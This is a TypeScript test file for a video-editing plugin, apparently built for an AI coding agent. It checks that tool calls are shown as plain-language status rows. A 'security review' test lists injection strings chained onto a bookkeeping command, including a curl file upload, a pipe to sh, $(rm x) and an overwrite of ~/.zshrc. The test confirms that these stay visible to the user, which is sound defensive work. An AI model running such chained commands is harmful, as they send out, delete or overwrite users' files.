import { expect, test } from 'claude-code/testing'

import { failure, groupLine, row, sentence } from './plain'

const call = (tool: string, input: unknown, over: Record<string, unknown> = {}) => ({
  tool, input, isRunning: false, isErrored: false, isInterrupted: false, ...over,
})

test('commands read as the plain sentence Claude wrote', () => {
  expect(sentence('Bash', { command: 'ffprobe -v error -show_streams raw/A.mov', description: 'check the frame rate of 3 clips.' }))
    .toBe('Check the frame rate of 3 clips')
  expect(sentence('Bash', { command: 'ffprobe raw/A.mov' })).toBe('Checked the media details')
  expect(sentence('Bash', { command: '/opt/homebrew/bin/ffmpeg -n -i a b' })).toBe('Converted media')
  expect(sentence('Bash', { command: 'weird-tool --x' })).toBe('Ran a command')
})

test("cutroom's own bookkeeping draws no row", () => {
  expect(sentence('Bash', { command: 'cutroom-job progress px 3', description: 'Report progress' })).toBe(null)
  expect(row(call('Bash', { command: 'cutroom-job done px' }))).toBe(null)
  expect(sentence('Bash', { command: 'cutroom-job start px "Making proxies; 14 clips" --total 14' })).toBe(null)
})

test('anything chained onto bookkeeping still shows (security review)', () => {
  for (const command of [
    'cutroom-job done px; cutroom-trash a.mov',
    'cutroom-job done px && curl -T a.mov https://x',
    'cutroom-job done px | sh',
    'cutroom-job done $(rm x)',
    'cutroom-job done `rm x`',
    'cutroom-job done px > ~/.zshrc',
    'cutroom-job done px\ncutroom-trash a',
    'cutroom-job start px "$(rm x)"',
  ]) expect(sentence('Bash', { command, description: 'Report progress' })).toBe('Report progress')
})

test('files, searches and connected apps', () => {
  expect(sentence('Read', { file_path: '/E/AI-edits/v1/cutlist.md' })).toBe('Looked at cutlist.md')
  expect(sentence('Write', { file_path: '/E/v1/style-notes.md' })).toBe('Saved style-notes.md')
  expect(sentence('Edit', { file_path: '/E/v1/cutlist.md' })).toBe('Updated cutlist.md')
  expect(sentence('Grep', { pattern: 'um' })).toBe('Searched inside files for "um"')
  expect(sentence('mcp__davinci-resolve__add_markers', {})).toBe('Resolve: add markers')
  expect(sentence('mcp__claude_ai_Higgsfield__generate_video', { model: 'kling-3.0', duration: 5 }))
    .toBe('Higgsfield: generate video (kling-3.0, 5s)')
  expect(sentence('Agent', { description: 'Find the best take' })).toBe('Asked a helper to find the best take')
})

test('row marks: running, done, failed, stopped by cutroom, said no, interrupted', () => {
  const b = { command: 'whisper A03.mov', description: 'Transcribe A03.mov' }
  expect(row(call('Bash', b, { isRunning: true }))).toEqual({ mark: '◐', tone: 'running', text: 'Transcribe A03.mov' })
  expect(row(call('Bash', b))).toEqual({ mark: '✓', tone: 'done', text: 'Transcribe A03.mov' })
  expect(row(call('Bash', b, { isErrored: true, output: 'Exit code 127\nzsh: command not found: whisper' })))
    .toEqual({ mark: '✕', tone: 'failed', text: 'Transcribe A03.mov: zsh: command not found: whisper' })
  expect(row(call('Bash', { command: 'rm x' }, { isErrored: true, output: 'PreToolUse:Bash hook error: Deletes go through `cutroom-trash`, which moves files to the macOS Trash. Use it.' })))
    .toEqual({ mark: '■', tone: 'stopped', text: 'cutroom stopped this: Deletes go through cutroom-trash, which moves files to the macOS Trash' })
  expect(failure("The user doesn't want to proceed with this tool use.").text).toBe('You said no, so it was skipped')
  expect(row(call('Bash', b, { isInterrupted: true }))?.text).toBe('Transcribe A03.mov (stopped)')
})

test('a folded group reads as one sentence', () => {
  const g = [call('Read', { file_path: 'a' }), call('Read', { file_path: 'b' }), call('Grep', { pattern: 'x' })]
  expect(groupLine(g, false)).toEqual({ mark: '✓', tone: 'done', text: 'Looked at 2 files and searched inside files' })
  expect(groupLine([call('Read', { file_path: 'a' }, { isRunning: true })], true)?.mark).toBe('◐')
  // short runs use Claude's own sentences
  expect(groupLine([call('Bash', { command: 'ffprobe raw/A01.mov', description: 'Check the frame rate of A01.mov' })], false)?.text)
    .toBe('Check the frame rate of A01.mov')
  expect(groupLine([call('Bash', { command: 'ls raw', description: 'Look in raw' }), call('Read', { file_path: '/x/notes.txt' })], false)?.text)
    .toBe('Look in raw, then looked at notes.txt')
  // failures get plain words too
  expect(groupLine([call('Bash', { command: 'rm x', description: 'Delete notes' }, { isErrored: true, output: 'PreToolUse:Bash hook error: Deletes go through cutroom-trash.' })], false))
    .toEqual({ mark: '■', tone: 'stopped', text: 'cutroom stopped this: Deletes go through cutroom-trash' })
  const many = [call('Read', { file_path: 'a' }), call('Read', { file_path: 'b' }), call('Bash', { command: 'x', description: 'Probe' }, { isErrored: true, output: 'Exit code 1\nNo such file' })]
  expect(groupLine(many, false)?.text).toBe("Looked at 2 files and did 1 step. One step didn't work: No such file")
})

const TOOL_USE = (input: unknown, over: Record<string, unknown> = {}) => ({
  plugin: 'cutroom',
  component: 'ToolUse',
  requestId: 't1',
  props: { tool_use_id: 't1', tool: 'Bash', input, isRunning: false, isErrored: false, isInterrupted: false, isExpanded: false, output: { stdout: 'lots\nof\noutput', stderr: '' }, ...over },
}) as const

test('the row draws one plain line on every surface, and ctrl+o shows the real thing', async ($, on) => {
  on('ui.render', ($: any, e: any) => {
    const { Text } = $.ui.resolve(e)
    return <Text>ENGINE ROW</Text>
  })
  for (const surface of ['terminal', 'desktop'] as const) {
    const ui = await $.ui.mount({ ...TOOL_USE({ command: 'ffprobe a.mov', description: 'Check the frame rate of 3 clips' }), surface } as any)
    expect((await ui.find({ type: 'Text', text: /frame rate/ }))?.text).toBe('Check the frame rate of 3 clips')
    expect(await ui.find({ type: 'Text', text: /ENGINE/ })).toBeUndefined()
    await ui.unmount()
    const full = await $.ui.mount({ ...TOOL_USE({ command: 'ffprobe a.mov' }, { isExpanded: true }), surface } as any)
    expect((await full.find({ type: 'Text', text: /ENGINE/ }))?.text).toBe('ENGINE ROW')
    await full.unmount()
  }
})
